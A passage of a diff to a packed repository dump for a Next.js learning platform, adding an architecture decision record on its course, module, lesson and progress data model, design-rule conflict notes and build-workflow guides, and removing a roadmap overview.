+21: 3. **Ordering Drift & Collisions**: Relying on unconstrained `orderIndex` fields causes duplicate positions, gaps, and race conditions during concurrent curriculum editing.
+22: 4. **IDOR Vulnerabilities**: Lacking strict parent-child verification permits students to modify other students' progress or access unpublished lesson content.
+23: 
+24: ## Decision
+25: We adopt a dedicated 4-tier domain model implemented via Prisma ORM on Neon PostgreSQL:
+26: 
+27: ```
+28: Course (Metadata, Lifecycle Status, Level, Instructor Relation)
+29:   └── Module (Section Header, Sequential orderIndex) [@@unique([courseId, orderIndex])]
+30:         └── Lesson (Lightweight Navigation, Slug, Preview Flag) [@@unique([moduleId, orderIndex])]
+31:               └── LessonContent (1-to-1 Isolated Heavy Payload: Markdown, HTML, Video, Resources)
+32: 
+33: User
+34:   ├── CourseEnrollment (Many-to-Many Join: Status, Aggregate Progress %, Timestamps)
+35:   └── LessonProgress (Granular Join: [userId, lessonId], isCompleted, completedAt)
+36: ```
+37: 
+38: Key Architectural Invariants:
+39: 1. **Isolated Heavy Payloads**: `LessonContent` is stored in a dedicated 1-to-1 table with cascade deletion, keeping the primary `Lesson` entity lightweight for fast curriculum tree fetching.
+40: 2. **Composite Uniqueness for Curriculum Order**: `[courseId, orderIndex]` and `[moduleId, orderIndex]` enforce sequential integrity at the database engine level.
+41: 3. **Two-Phase Reordering & Row Locking**: Curriculum reordering employs two-phase updates with negative offsets under an exclusive parent row lock (`SELECT ... FOR UPDATE`), preventing transient unique key violations (`P2002`).
+42: 4. **Strict Progress Isolation**: Student progress exists solely in the `LessonProgress` join table scoped strictly to `(userId, lessonId)` with composite uniqueness `@@unique([userId, lessonId])`. It is NEVER stored on the curriculum entity.
+43: 5. **Multi-Tier Authorization (IDOR Defense)**: Every mutation asserts caller ownership (`instructorId === session.userId` or `admin`). Player endpoints strictly verify cross-course boundaries (`hierarchy.module.course.id === course.id`).
+44: 
+45: ## Alternatives Considered
+46: - **Single Monolithic Lesson Table**: Combining metadata and body content into a single table.
+47:   *Rejected*: Degrades query performance for syllabus views and player sidebar navigation where lesson body is unnecessary.
+48: - **Embedded Document Store (JSONB for Modules/Lessons)**: Storing the entire curriculum outline as a JSONB array on the `Course` model.
+49:   *Rejected*: Eliminates relational foreign keys, complicates incremental progress tracking, prevents atomic transactions on individual lessons, and hinders SQL indexing.
+50: - **Client-Driven Reorder Swaps**: Swapping adjacent indices on client requests.
+51:   *Rejected*: Susceptible to race conditions, out-of-order networks, and gaps when multiple items are reordered.
+52: 
+53: ## Reason
+54: This model provides the optimal balance of relational integrity, high-throughput query performance, and ironclad multi-tenant security:
+55: - Syllabus and sidebar queries fetch only lightweight metadata (`id`, `title`, `orderIndex`, `isFreePreview`).
+56: - Student progress is completely partitioned, preventing data leaks.
+57: - Database constraints guarantee collision-free ordering.
+58: 
+59: ## Consequences
+60: ### Positive
+61: - Zero risk of cross-student progress leakage.
+62: - High-performance course catalog and player navigation.
+63: - Deterministic, collision-safe curriculum reordering.
+64: - Clear separation between public preview material and restricted content.
+65: 
+66: ### Negative / Trade-offs
+67: - Creating and reordering curriculum items requires database transactions and parent course row locks.
+68: - Reading full lesson content requires a relational join or secondary lookup.
+69: 
+70: ## Evidence / References
+71: - [Architecture.md](file:///d:/dev%20folder/nextjs/nextjs/docs/Architecture.md)
+72: - [Entities.md](file:///d:/dev%20folder/nextjs/nextjs/docs/reference/Entities.md)
+73: - `prisma/schema.prisma`
+74: - Automated test suites: `src/__tests__/security/idor.test.ts`, `src/services/__tests__/concurrency.test.ts`
+`````
+
+## File: docs/decisions/Enforcement Layer Overlap.md
+`````markdown
+ 1: # Enforcement Layer Overlap
+ 2: 
+ 3: Comparing enforcement approaches across Impeccable, Vercel, and Taste Skill.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Overlap Map
+ 8: 
+ 9: | Category        | Taste Skill             | Impeccable        | Vercel            |
+10: | --------------- | ----------------------- | ----------------- | ----------------- |
+11: | Anti-slop tells | Section 14              | 45-rule detector  | Audit findings    |
+12: | Typography      | Balance/pretty wrapping | Type scale rules  | Line length rules |
+13: | Color           | One accent, one palette | Color violations  | Contrast rules    |
+14: | Layout          | 4+ layout families      | Layout violations | Responsive rules  |
+15: | Interactions    | Hit areas, press states | Interaction rules | Touch targets     |
+16: | Accessibility   | Minimal                 | Minimal           | Comprehensive     |
+17: | Performance     | Minimal                 | Minimal           | Comprehensive     |
+18: 
+19: ---
+20: 
+21: # Resolution
+22: 
+23: When rules overlap:
+24: 
+25: 1. Project rules in `docs/rules/` take precedence.
+26: 2. Accessibility: Vercel guidelines are most comprehensive.
+27: 3. Aesthetic direction: Taste Skill is most comprehensive.
+28: 4. Anti-pattern detection: Impeccable is most comprehensive.
+29: 5. Micro-interactions: MIFB is most comprehensive.
+30: 
+31: ---
+32: 
+33: # Conflict Resolution
+34: 
+35: When skills conflict:
+36: 
+37: 1. Document the conflict.
+38: 2. Choose the rule that best fits the project.
+39: 3. Record the decision in `docs/decisions/`.
+40: 4. Apply consistently.
+41: 
+42: ---
+43: 
+44: # Sources
+45: 
+46: - Gogh - Enforcement layer overlap analysis.
+47: - Taste Skill v2, Impeccable, Vercel web-design-guidelines.
+`````
+
+## File: docs/decisions/Font Ban Conflicts.md
+`````markdown
+ 1: # Font Ban Conflicts
+ 2: 
+ 3: Resolving conflicts between font-related rules across design skills.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Conflict
+ 8: 
+ 9: Different skills have different opinions about font usage:
+10: 
+11: - Taste Skill: Bans Inter for everything without justification.
+12: - Impeccable: Flags Inter as an anti-slop tell.
+13: - Anthropic: Recommends committing to a type direction.
+14: - Vercel: Focuses on typography rules (balance, pretty, line length).
+15: 
+16: ---
+17: 
+18: # Resolution
+19: 
+20: - Inter is not banned outright, but using it for everything without justification is flagged.
+21: - Every project should commit to a type direction before building.
+22: - Use the project's chosen font consistently.
+23: - Apply typography rules (balance, pretty, line length) regardless of font choice.
+24: 
+25: ---
+26: 
+27: # Application
+28: 
+29: - Choose a font that fits the project's brand and audience.
+30: - Document the choice in `DESIGN.md` or equivalent.
+31: - Apply typography rules from all skills.
+32: - Do not switch fonts mid-project without explicit decision.
+33: 
+34: ---
+35: 
+36: # Sources
+37: 
+38: - Taste Skill v2 - Inter ban rule.
+39: - Impeccable - Named anti-slop tells.
+40: - Anthropic frontend-design - Typography direction.
+`````
+
+## File: docs/decisions/Motion Doctrine Conflicts.md
+`````markdown
+ 1: # Motion Doctrine Conflicts
+ 2: 
+ 3: Resolving conflicts between animation and motion rules.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Conflict
+ 8: 
+ 9: Different skills have different motion philosophies:
+10: 
+11: - Taste Skill: Motion Intensity dial (1-10).
+12: - MIFB: Specific animation values (duration, stagger, spring).
+13: - Impeccable: Minimal motion rules.
+14: - Vercel: Comprehensive animation rules (reduced motion, duration limits).
+15: 
+16: ---
+17: 
+18: # Resolution
+19: 
+20: - The Motion Intensity dial sets the overall animation level.
+21: - MIFB provides the specific values when animations are used.
+22: - Vercel rules for accessibility (reduced motion) are non-negotiable.
+23: - Impeccable flags excessive or broken animations.
+24: 
+25: ---
+26: 
+27: # Application
+28: 
+29: 1. Set the Motion Intensity dial before building.
+30: 2. Apply MIFB animation values for micro-interactions.
+31: 3. Always honor `prefers-reduced-motion`.
+32: 4. Keep animations under 300ms for micro-interactions.
+33: 5. Use `transform` and `opacity` for GPU-accelerated animations.
+34: 
+35: ---
+36: 
+37: # Sources
+38: 
+39: - Taste Skill v2 - Motion Intensity dial.
+40: - MIFB - Animation values.
+41: - Vercel web-design-guidelines - Animation rules.
+`````
+
+## File: docs/decisions/Prompt Layer vs Toolchain Layer.md
+`````markdown
+ 1: # Prompt Layer vs Toolchain Layer
+ 2: 
+ 3: When to use prompt-based guidance vs persistent toolchain enforcement.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Prompt Layer
+ 8: 
+ 9: Prompt-based guidance is conversational:
+10: 
+11: - Three dials (set in conversation).
+12: - Aesthetic direction (committed verbally).
+13: - Hero thesis (defined in conversation).
+14: - Design rules (read from documentation).
+15: 
+16: ## When to Use
+17: 
+18: - Setting aesthetic direction.
+19: - Defining project-specific rules.
+20: - Creative decisions.
+21: - One-time setup.
+22: 
+23: ---
+24: 
+25: # Toolchain Layer
+26: 
+27: Toolchain enforcement is persistent:
+28: 
+29: - Impeccable detector (45 rules).
+30: - ESLint rules (automated).
+31: - TypeScript checks (automated).
+32: - Pre-commit hooks (automated).
+33: 
+34: ## When to Use
+35: 
+36: - Code quality enforcement.
+37: - Anti-pattern detection.
+38: - CI/CD checks.
+39: - Ongoing validation.
+40: 
+41: ---
+42: 
+43: # The Balance
+44: 
+45: - Use prompts for direction and creativity.
+46: - Use toolchain for enforcement and consistency.
+47: - Prompts set the rules; toolchain enforces them.
+48: - Neither is sufficient alone.
+49: 
+50: ---
+51: 
+52: # Application
+53: 
+54: 1. Use prompts to set the three dials and aesthetic direction.
+55: 2. Use toolchain to enforce anti-slop rules and code quality.
+56: 3. Document decisions in `docs/decisions/`.
+57: 4. Update toolchain rules when project rules change.
+58: 
+59: ---
+60: 
+61: # Sources
+62: 
+63: - Gogh - Prompt layer vs toolchain layer analysis.
+64: - Taste Skill v2, Impeccable, Vercel web-design-guidelines.
+`````
+
 ## File: docs/decisions/README.md
 `````markdown
  1: # Architecture Decision Records (ADRs)
@@ -2316,20 +3576,21 @@ tsconfig.json
  9: | [001](001-use-layered-architecture.md) | Use 5-Layer Downward Architecture | Accepted | 2026-07-20 |
 10: | [002](002-use-neon-with-prisma.md) | Use Neon PostgreSQL with Prisma ORM | Accepted | 2026-07-20 |
 11: | [003](003-use-shadcn-ui.md) | Use shadcn/ui Component Library | Accepted | 2026-07-20 |
-12: 
-13: ---
-14: 
-15: ## When to Write an ADR
-16: Write an ADR when a decision:
-17: - Introduces or changes an architectural layer or boundary.
-18: - Changes database provider, ORM, or major transaction pattern.
-19: - Changes authentication, authorization, or security model.
-20: - Introduces an impactful third-party infrastructure dependency.
-21: - Alters public contracts or API conventions across multiple features.
-22: 
-23: *Do NOT write ADRs for local variable renaming, trivial component refactoring, or minor UI tweaks.*
-24: 
-25: To create a new ADR, copy [`TEMPLATE.md`](TEMPLATE.md) and number it sequentially (`004-...`).
+12: | [004](004-lms-domain-model.md) | Use Dedicated Curriculum, Enrollment, and Isolated Progress Models | Accepted | 2026-09-12 |
+13: 
+14: ---
+15: 
+16: ## When to Write an ADR
+17: Write an ADR when a decision:
+18: - Introduces or changes an architectural layer or boundary.
+19: - Changes database provider, ORM, or major transaction pattern.
+20: - Changes authentication, authorization, or security model.
+21: - Introduces an impactful third-party infrastructure dependency.
+22: - Alters public contracts or API conventions across multiple features.
+23: 
+24: *Do NOT write ADRs for local variable renaming, trivial component refactoring, or minor UI tweaks.*
+25: 
+26: To create a new ADR, copy [`TEMPLATE.md`](TEMPLATE.md) and number it sequentially (`004-...`).
 `````
 
 ## File: docs/decisions/TEMPLATE.md
@@ -2690,1864 +3951,1416 @@ tsconfig.json
 56: - **Student Roster**: `findEnrollmentsByCourseId` executes a single query with `include: { user: { select: ... } }`, retrieving the entire student roster with user profiles in a single round-trip.
 `````
 
-## File: docs/tasks/00-overview.md
+## File: docs/flows/Build Greenfield (Prompt 1).md
 `````markdown
-  1: # LMS Implementation Roadmap: Master Overview & Architectural Contract
-  2: 
-  3: ## 1. Executive Summary
-  4: 
-  5: This document serves as the **authoritative architectural contract and execution roadmap** for the LMS (Learning Management System) platform.
-  6: 
-  7: The **CURRENT PROJECT is the single source of truth**. All architectural principles, technology choices, domain boundaries, and coding conventions are established by the current codebase:
-  8: - **Framework**: Next.js 16 (App Router, Server Components first)
-  9: - **UI Library**: React 19 + Tailwind CSS v4 + shadcn/ui
- 10: - **Language**: TypeScript (strict mode, zero `any`)
- 11: - **Database & ORM**: PostgreSQL (Neon Serverless) via Prisma 7
- 12: - **Authentication**: Better Auth (session-based, email/password + OAuth foundation)
- 13: - **Authorization**: Fine-grained RBAC (`Role`, `Permission`, `UserRole`, `RolePermission`)
- 14: - **Validation**: Zod (runtime validation and inferred TypeScript types)
- 15: - **Forms**: React Hook Form with `@hookform/resolvers/zod`
- 16: - **Observability & Testing**: Sentry + Jest + React Testing Library
- 17: - **Architecture**: Strict Layered Architecture (`UI → Actions / Routes → Services → Concrete Repositories → Database`)
- 18: 
- 19: The legacy Repomix report was analyzed **exclusively** as a source of domain inspiration, UX patterns, and anti-patterns to avoid. It is **not** a feature specification, backlog, or roadmap.
- 20: 
- 21: ---
- 22: 
- 23: ## 2. Scope Boundary
- 24: 
- 25: ```
- 26: ┌────────────────────────────────────────────────────────────────────────┐
- 27: │                              IN SCOPE (MVP)                            │
- 28: │  Users / Existing Auth & RBAC · Instructor-Owned Courses               │
- 29: │  Modules · Lessons · Requirement-Driven Lesson Content                 │
- 30: │  Course Enrollment · Per-Student Lesson Progress                       │
- 31: │  Instructor Course Management · Student Learning Experience            │
- 32: └────────────────────────────────────────────────────────────────────────┘
- 33:                                    │
- 34:                                    ▼
- 35: ┌────────────────────────────────────────────────────────────────────────┐
- 36: │                        POSTPONED / FUTURE                              │
- 37: │  Lesson Q&A Discussions · Course Notifications · Payments & Stripe     │
- 38: │  Quizzes & Assessments · Completion Certificates · Study Cohorts       │
- 39: └────────────────────────────────────────────────────────────────────────┘
- 40:                                    │
- 41:                                    ▼
- 42: ┌────────────────────────────────────────────────────────────────────────┐
- 43: │                              REJECTED                                  │
- 44: │  Social Newsfeed & Wall · Channels & Posts · Likes & Reactions         │
- 45: │  Multi-Tenancy / Organizations / Workspaces · Stripe Connect           │
- 46: │  Affiliate Referral Engine · Custom White-Label Domains · Direct Chat  │
- 47: │  Generic Base Repositories · Premature Multi-Provider Storage Engines  │
- 48: │  TanStack Query / Redux · External Search Engines (Algolia/Elastic)    │
- 49: └────────────────────────────────────────────────────────────────────────┘
- 50: ```
- 51: 
- 52: ### In Scope (Core MVP Learning Workflow)
- 53: 1. **Curriculum Hierarchy**: Sequential educational content organization (`Course → Module → Lesson`) with explicit integer ordering (`orderIndex`) and draft/published lifecycles.
- 54: 2. **Lesson Content**: Minimal, requirement-driven lesson content authoring supporting markdown/structured text, formatted code snippets, and video embed URLs (YouTube, Vimeo, Loom, or direct video link).
- 55: 3. **Course Media**: Simple, practical thumbnail and resource URL references without over-engineered cloud provider abstractions.
- 56: 4. **Student Enrollment**: Explicit enrollment entity associating students with courses, granting access to restricted lessons.
- 57: 5. **Per-Student Progress Tracking**: Individualized, user-isolated completion tracking per lesson (`LessonProgress`) and aggregate progress percentages per course (`CourseEnrollment`).
- 58: 6. **Student Learning Experience**: Public course catalog with basic database filtering (`contains`), syllabus preview, and a distraction-free course player.
- 59: 7. **Instructor Course Management**: Dedicated instructor management views for drafting courses, organizing modules and lessons with ordering, publishing courses, and inspecting student rosters.
- 60: 8. **Multi-Tier Authorization & Resource Ownership**: Comprehensive access control enforcing authentication, role validation, resource ownership (`course.instructorId === session.userId`), and resource state checks on every operation.
- 61: 
- 62: ### Postponed (Future Considerations)
- 63: *These features are valuable for future iterations but are intentionally postponed until the core LMS workflow is verified:*
- 64: 1. **Lesson Q&A Discussions**: Contextual threaded questions attached strictly to individual lessons.
- 65: 2. **Platform Notifications**: Email and in-app alerts for course enrollment, milestone completions, and instructor announcements.
- 66: 3. **Monetization & Payments**: Direct checkout for purchasing paid courses or subscriptions.
- 67: 4. **Assessments & Quizzes**: Multiple-choice quizzes, assignments, and automated grading.
- 68: 5. **Course Completion Certificates**: Automated PDF certificate generation upon 100% course completion.
- 69: 6. **Cohorts & Study Groups**: Collaborative student groups if required by future curriculum models.
- 70: 
- 71: ### Rejected (Out of Scope)
- 72: *Strictly excluded from the LMS core:*
- 73: 1. **Multi-Tenancy, Organizations, & Workspaces**: The current project does not have an organization or tenant model. Resource ownership belongs directly to individual users/instructors.
- 74: 2. **Social Community & Newsfeed**: Wall posts, social feeds, channel discussions, likes, and reactions.
- 75: 3. **Multi-Vendor Marketplace (Stripe Connect)**: Split payouts and multi-vendor seller onboarding.
- 76: 4. **Affiliate Referral Engine**: Tracking affiliate codes and commissions.
- 77: 5. **Custom Domain Multi-Tenancy**: DNS routing and custom domain mapping.
- 78: 6. **Real-Time Direct Messaging / Chat**: Peer-to-peer or group instant messaging.
- 79: 7. **Generic Base Repositories**: `BaseRepository<T>`, `GenericRepository<T>`, or repository factories.
- 80: 8. **Premature Storage Engines**: Complex multi-cloud storage frameworks before an actual requirement exists.
- 81: 9. **External Search Engines**: Algolia, Elasticsearch, or Meilisearch.
- 82: 
- 83: ---
- 84: 
- 85: ## 3. Feature Decision Matrix
- 86: 
- 87: | Legacy Concept | Relevance to Current LMS | Decision | Architectural & Product Rationale |
- 88: |---|---|---|---|
- 89: | **Courses** | Core LMS Domain | **ADOPT** | Central domain model of the LMS. Owned directly by authoring instructors, enrolled by students. |
- 90: | **Modules** | Core LMS Domain | **ADAPT** | Re-modeled as direct children of Course (not Group/Community) with explicit `orderIndex` sorting. |
- 91: | **Sections / Lessons** | Core LMS Domain | **ADAPT** | Renamed to Lessons; isolated from community channels. Features structured content and per-student progress. |
- 92: | **Enrollment** | Core LMS Domain | **ADOPT** | Fundamental relation linking `User` to `Course`, enabling access control and progress aggregation. |
- 93: | **Learning Progress** | Core LMS Domain | **ADAPT** | **Fixed critical legacy defect**: Legacy stored `complete: Boolean` globally on the lesson itself. Redesigned into individual `LessonProgress` records per user. |
- 94: | **User Profile & Roles** | Core LMS Domain | **ADAPT** | Enhanced with Student and Instructor personas on top of existing Better Auth and RBAC foundation. |
- 95: | **RBAC Authorization** | Core Infrastructure | **ADOPT** | Existing database RBAC (`Role`, `Permission`, `UserRole`, `RolePermission`) is authoritative. |
- 96: | **Lesson Content Authoring** | Core LMS Domain | **ADAPT** | Requirement-driven structured content (markdown/text, code, video embed URLs) with server-side sanitization. |
- 97: | **Course Media Handling** | Core LMS Domain | **ADAPT** | Simple URL references and direct file handling; no premature multi-provider abstraction layer. |
- 98: | **Course Catalog & Filtering** | Discovery | **ADAPT** | Server-rendered catalog with basic database filtering (`contains` on title/category) using Prisma. |
- 99: | **Student Learning Player** | Core UX | **ADAPT** | Distraction-free player layout inspired by legacy course viewer, built with Server Components and accessible navigation. |
-100: | **Form Patterns (RHF + Zod)** | Engineering Pattern | **USE AS PATTERN** | Reusable React Hook Form + Zod pattern with unified error mapping. |
-101: | **Loading & Empty States** | UX Pattern | **USE AS PATTERN** | shadcn/ui skeletons and structured empty states for consistent async UX. |
-102: | **Client-Side ID Generation (`uuidv4()`)** | Legacy Flaw | **REJECT** | Severe security flaw in legacy code. All IDs (`cuid()`) and timestamps are generated server-side. |
-103: | **Unauthenticated Actions** | Legacy Flaw | **REJECT** | Legacy actions lacked session and ownership checks. Current project enforces strict multi-level authorization. |
-104: | **Groups (Communities)** | Community Tool | **POSTPONE** | Not required for a focused LMS. Postponed to Future Considerations. |
-105: | **Channels** | Community Tool | **POSTPONE** | Replaced by direct course hierarchy. |
-106: | **Posts & Social Wall** | Social Network | **REJECT** | Scope bloat that distracts from the core learning experience. |
-107: | **Likes & Reactions** | Social Network | **REJECT** | Irrelevant for learning content delivery. |
-108: | **Direct Messaging (Chat)** | Communication | **POSTPONE** | High operational and infrastructure cost; not part of LMS foundation. |
-109: | **Lesson Q&A Discussions** | Educational Feature | **POSTPONE** | Valuable future enhancement once core learning delivery is verified. |
-110: | **Stripe Subscriptions** | Monetization | **POSTPONE** | Deferred until foundational LMS functionality is verified. |
-111: | **Stripe Connect** | Multi-Vendor Marketplace | **REJECT** | Multi-tenant marketplace payouts are outside the current product scope. |
-112: | **Affiliate Tracking** | Growth Marketing | **REJECT** | Not relevant to the core educational product. |
-113: | **Custom Domains** | White-labeling | **REJECT** | Unnecessary infrastructure overhead for the current platform. |
-114: | **TanStack Query Everywhere** | State Architecture | **REJECT** | Next.js 16 Server Components and Server Actions provide clean data fetching without client cache bloat. |
-115: | **Generic Base Repositories** | Over-engineering | **REJECT** | Adds unnecessary indirection without real value. Concrete domain repositories only. |
-116: | **Multi-Tenancy / Organizations** | Invented Concept | **REJECT** | No tenant/org model exists. Resource ownership (`course.instructorId === session.userId`) is used directly. |
-117: 
-118: ---
-119: 
-120: ## 4. Architectural Invariants
-121: 
-122: All tasks must strictly adhere to the layered architecture:
-123: 
-124: ```
-125: UI (Server Components first, Client Components for interactive leaves only)
-126:  ↓
-127: Actions / Route Handlers (Transport boundary, requireAuth(), Zod input parsing)
-128:  ↓
-129: Services (4-tier authorization, business rules, transactions)
-130:  ↓
-131: Concrete Repositories (Concrete domain Prisma queries, data mapping, persistence)
-132:  ↓
-133: Database (Neon PostgreSQL via Prisma 7)
-134: ```
-135: 
-136: ### Invariant Rules:
-137: 1. **Layer Integrity**: UI never accesses Repositories or Prisma directly. Actions never execute business logic or query Repositories directly. Services never know about HTTP or Next.js transport objects (`Request`, `Response`, `headers`).
-138: 2. **Concrete Repositories Only**: No `BaseRepository<T>`, `GenericRepository<T>`, or abstract repository factories. Each domain entity has a concrete repository (`UserRepository`, `CourseRepository`, `ModuleRepository`, `LessonRepository`, `EnrollmentRepository`, `LessonProgressRepository`).
-139: 3. **No Invented Tenancy**: The platform has no tenant or organization entity. Authorization operates on **Resource Ownership**:
-140:    $$\text{Instructor A owns Course X} \iff \text{Course.instructorId} == \text{session.userId}$$
-141: 4. **Server Components First**: Server Components perform data fetching by default. Client Components are used only for interactive leaves (forms, collapsible drawers, media players).
-142: 5. **Server-Side Identity**: All IDs are generated server-side or database-side (`cuid()`). No client-supplied IDs are ever accepted for creation operations.
-143: 6. **Type Safety & Zero `any`**: All inputs, database models, and return payloads must have inferred or explicit TypeScript types validated by Zod schemas.
-144: 
-145: ---
-146: 
-147: ## 5. Authorization & Resource Ownership Doctrine
-148: 
-149: Authentication and role checks alone are **NOT** sufficient. Every protected mutation and sensitive read must satisfy the 4-tier authorization check:
-150: 
-151: ```
-152: ┌────────────────────────────────────────────────────────┐
-153: │ 1. Authentication                                      │
-154: │    Is the user session active and verified?            │
-155: └──────────────────────────┬─────────────────────────────┘
-156:                            │
-157:                            ▼
-158: ┌────────────────────────────────────────────────────────┐
-159: │ 2. Role / Permission Authorization                     │
-160: │    Does the user hold the necessary role/permission?   │
-161: └──────────────────────────┬─────────────────────────────┘
-162:                            │
-163:                            ▼
-164: ┌────────────────────────────────────────────────────────┐
-165: │ 3. Resource Ownership Verification                     │
-166: │    Does the user own this specific resource?           │
-167: │    (e.g., course.instructorId === session.userId)     │
-168: └──────────────────────────┬─────────────────────────────┘
-169:                            │
-170:                            ▼
-171: ┌────────────────────────────────────────────────────────┐
-172: │ 4. Resource State Validation                           │
-173: │    Is the operation permitted for the resource's       │
-174: │    current lifecycle state (DRAFT/PUBLISHED/ARCHIVED)? │
-175: └────────────────────────────────────────────────────────┘
-176: ```
-177: 
-178: ### Concrete Ownership Invariants:
-179: - **Instructor Resource Ownership**: Instructor A cannot view, update, delete, or publish Instructor B's course or its modules/lessons. Services must query the course and assert `course.instructorId === session.userId`.
-180: - **Student Progress Isolation**: Student A cannot view or mutate Student B's progress. Progress records are strictly scoped to `session.userId`.
-181: - **Course Publication State**: A course cannot be transitioned to `PUBLISHED` unless it contains at least one module and at least one lesson.
-182: - **Enrolled Student Access**: Restricted lessons can only be read by students with an active `CourseEnrollment` record, or if the lesson has `isFreePreview: true`.
-183: - **Roster Privacy**: Course enrollment rosters can only be viewed by the authoring instructor or a platform administrator.
-184: - **No Self-Privilege Escalation**: Users cannot grant themselves the `instructor` or `admin` role through profile updates.
-185: 
-186: ---
-187: 
-188: ## 6. Library & Version Policy
-189: 
-190: 1. **Current Codebase is Authoritative**: Never copy package versions or choices from the legacy report.
-191: 2. **Inspect Existing Dependencies First**: Always prefer installed libraries (`zod`, `react-hook-form`, `lucide-react`, `@prisma/client`, `better-auth`) before considering additions.
-192: 3. **Strict Justification Required**: Any new dependency must be justified by an explicit requirement that the current stack cannot solve cleanly.
-193: 4. **No Premature Additions**:
-194:    - No TanStack Query: Server Components and Server Actions solve data fetching natively.
-195:    - No S3 / Cloud storage frameworks: Simple URL references and direct file handling only when needed.
-196:    - No heavy TipTap extensions: Minimal content editor tailored to lesson needs.
-197: 5. **Compatibility Verification**: Any new package must be verified compatible with Next.js 16, React 19, and TypeScript 5.x.
-198: 
-199: ---
-200: 
-201: ## 7. Definition of Done (DoD) Rules
-202: 
-203: A task is considered complete **only** when all of the following criteria are met:
-204: 
-205: 1. **Architectural Compliance**: Adheres strictly to `UI → Actions → Services → Concrete Repositories → Database`. No layer boundaries are bypassed.
-206: 2. **Multi-Tier Authorization**: Authentication, role verification, resource ownership, and state validation are enforced and covered by tests.
-207: 3. **Input Validation**: All user inputs are parsed and validated with Zod schemas at the Action boundary.
-208: 4. **Type Safety**: Zero `any` types. All types are either inferred from Prisma/Zod or explicitly defined.
-209: 5. **Per-Feature Testing**: Unit tests for Services, integration tests for Actions/Repositories, and component tests for key interactive UI elements.
-210: 6. **Error Handling**: Uses the typed `AppError` hierarchy (`NotFoundError`, `UnauthorizedError`, `ForbiddenError`, `ValidationError`) and returns structured `ActionResult<T>`.
-211: 7. **Design Rules Compliance**: Follows project design rules (anti-slop, no em-dashes, 40x40px touch targets, press feedback, `prefers-reduced-motion`).
-212: 8. **Clean Quality Gate**: `pnpm lint`, `pnpm typecheck` (`tsc --noEmit`), and `pnpm test` pass with zero errors.
-213: 9. **Documentation**: Task documentation and any relevant architecture docs are updated to reflect the actual implemented state.
-214: 
-215: ---
-216: 
-217: ## 8. Implementation Sequence
-218: 
-219: The roadmap proceeds in a strict, dependency-ordered sequence of **8 cohesive tasks**:
-220: 
-221: ```
-222: Task 01: Core Architecture & Foundation Hardening
-223:   │  (Error handling, simple ActionResult<T>, session & role helpers, pagination schema)
-224:   ▼
-225: Task 02: User Profile & Role Management
-226:   │  (Student/Instructor profiles, RBAC role assignment, resource self-ownership, settings UI)
-227:   ▼
-228: Task 03: Course & Curriculum Domain
-229:   │  (Course, Module, Lesson models, ordering, instructor ownership enforcement, services)
-230:   ▼
-231: Task 04: Lesson Content Authoring & Media Handling
-232:   │  (LessonContent model, focused editor, HTML sanitization, simple media/video URL handling)
-233:   ▼
-234: Task 05: Enrollment & Learning Progress Tracking
-235:   │  (CourseEnrollment, user-isolated LessonProgress, progress calculation, next lesson)
-236:   ▼
-237: Task 06: Course Catalog & Student Learning Player
-238:   │  (Server-rendered catalog, basic database filtering, syllabus preview, distraction-free player)
-239:   ▼
-240: Task 07: Instructor Course Management Workspace
-241:   │  (Course management, curriculum builder with reordering, student roster insights)
-242:   ▼
-243: Task 08: Final QA, Security Audit & Documentation
-244:      (Holistic test execution, IDOR and XSS penetration audit, performance baselines, ADR 004)
-245: ```
+ 1: # Build Greenfield (Prompt 1)
+ 2: 
+ 3: Workflow for building new components and features from scratch.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Steps
+ 8: 
+ 9: ## 1. Set the Three Dials
+10: 
+11: Before writing any code, commit to:
+12: 
+13: - Design Variance (1-10, default 8).
+14: - Motion Intensity (1-10, default 6).
+15: - Visual Density (1-10, default 4).
+16: 
+17: ## 2. Define the Direction
+18: 
+19: - Pick a 4-6 value named hex palette.
+20: - Define the hero thesis (one sentence).
+21: - Identify the primary CTA.
+22: - Choose one justified aesthetic risk.
+23: 
+24: ## 3. Read Existing Patterns
+25: 
+26: - Check `components/ui/` for existing primitives.
+27: - Check `docs/rules/` for applicable rules.
+28: - Check `docs/skills/` for design skill references.
+29: 
+30: ## 4. Build the Component
+31: 
+32: - Start with Server Components.
+33: - Use shadcn/ui primitives where possible.
+34: - Apply Tailwind utilities consistently.
+35: - Use `cn()` for conditional classes.
+36: - Follow the layered architecture.
+37: 
+38: ## 5. Apply Design Rules
+39: 
+40: - Check against `docs/rules/AI Tells (Forbidden Patterns).md`.
+41: - Apply micro-interaction rules from `docs/skills/Make Interfaces Feel Better.md`.
+42: - Ensure typography follows `docs/rules/Anthropic Frontend Design Rules.md`.
+43: 
+44: ## 6. Run Pre-Flight
+45: 
+46: - Complete the Section 14 checklist.
+47: - Verify all checks pass.
+48: - If any check fails, revise and re-check.
+49: 
+50: ## 7. Document
+51: 
+52: - Update relevant documentation.
+53: - Add to component inventory if new.
+54: - Document any design decisions.
+55: 
+56: ---
+57: 
+58: # Architecture Flow
+59: 
+60: ```
+61: Page (Server Component)
+62: ↓
+63: Layout Component
+64: ↓
+65: Feature Component
+66: ↓
+67: Shared Component
+68: ↓
+69: UI Primitive (shadcn/ui)
+70: ```
+71: 
+72: ---
+73: 
+74: # Documentation Rules
+75: 
+76: Every significant change should update the relevant documentation.
+77: 
+78: Architecture decisions should be documented before implementation whenever possible.
+79: 
+80: Documentation should always reflect the current state of the project.
 `````
 
-## File: docs/tasks/01-architecture-foundation.md
+## File: docs/flows/Full Stack Build Flow.md
 `````markdown
-  1: # Task 01: Core Architecture & Foundation Hardening
+ 1: # Full Stack Build Flow
+ 2: 
+ 3: Workflow for building full-stack features with React 19, Server Actions, and Prisma.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Steps
+ 8: 
+ 9: ## 1. Define the Feature
+10: 
+11: - What does the user need?
+12: - What data is required?
+13: - What interactions are needed?
+14: 
+15: ## 2. Design the Data Model
+16: 
+17: - Add Prisma schema changes.
+18: - Run `pnpm prisma migrate dev`.
+19: - Update `lib/db.ts` if needed.
+20: 
+21: ## 3. Create the Repository
+22: 
+23: - File: `lib/repositories/[feature].ts`.
+24: - CRUD operations only.
+25: - No business logic.
+26: - Use Prisma Client.
+27: 
+28: ## 4. Create the Service
+29: 
+30: - File: `lib/services/[feature].ts`.
+31: - Business rules and workflows.
